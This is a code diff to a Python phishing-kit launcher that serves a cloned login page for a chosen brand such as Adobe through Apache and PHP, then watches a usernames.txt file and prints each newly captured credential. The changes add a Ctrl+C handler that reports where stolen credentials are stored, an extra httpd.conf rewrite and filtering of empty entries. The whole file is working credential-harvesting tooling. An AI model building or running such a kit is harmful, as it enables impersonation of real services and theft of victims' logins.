@@ -1,6 +1,7 @@
 #!/usr/bin/python3
 import os
 import time
+from signal import signal, SIGINT
 
 sites = {
     "1": "adobe",
@@ -45,25 +46,46 @@ web_num = input("\nPlease enter a number: ")
 website = sites[web_num]
 
 print("\nSetting up DocumentRoot for apache...")
+os.system("sed -i 's!/phish/sites/.*\"!/phish/sites/{}\"!g' /etc/apache2/httpd.conf".format(website))
 os.system("sed -i 's!/var/www/localhost/htdocs!/phish/sites/{}!g' /etc/apache2/httpd.conf".format(website))
-time.sleep(1)
 
 print("Starting php server...")
 os.system("chmod 777 /phish/sites/{}".format(website))  # Add permissions for the php files to read and write
 os.system("cd /phish/sites/{}/ && php -S 127.0.0.1:80 > /dev/null 2&>1 & sleep 2".format(website))
 
 print("Starting web server...\n")
+# already_running = False
+# for proc in psutil.process_iter():
+#     try:
+#         if 'httpd'.lower() in proc.name().lower():
+#             # If httpd is already running, we need to restart it
+#             already_running = True
+#             print("httpd already running, now restarting")
+#             os.system("rc-service apache2 restart")
+#             pass
+#     except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+#         pass
+
+# If httpd not already running, start it
+#if already_running == False:
 os.system("httpd 2> /dev/null")
 time.sleep(2)
 
 print("Open 'localhost:3333' on your local machine.\n")
 
+# Signal handler for CTRL+C
+def handler(signal_received, frame):
+    print("\nCaptured credentials stored in /phish/sites/{}/usernames.txt".format(website))
+    exit(0)
+
+signal(SIGINT, handler)
 print("Waiting for credentials...")
 count = 0
 while 1:
     if os.path.exists("/phish/sites/{}/usernames.txt".format(website)):
         creds = open("/phish/sites/{}/usernames.txt".format(website)).read().split("\n")
         if (count < len(creds)):
-            print("New credentials captured: " + creds[count - 1])
+            if creds[count - 1] != "":
+                print("New credentials captured: " + creds[count - 1])
             count += 1
-    time.sleep(3)
+    time.sleep(2)
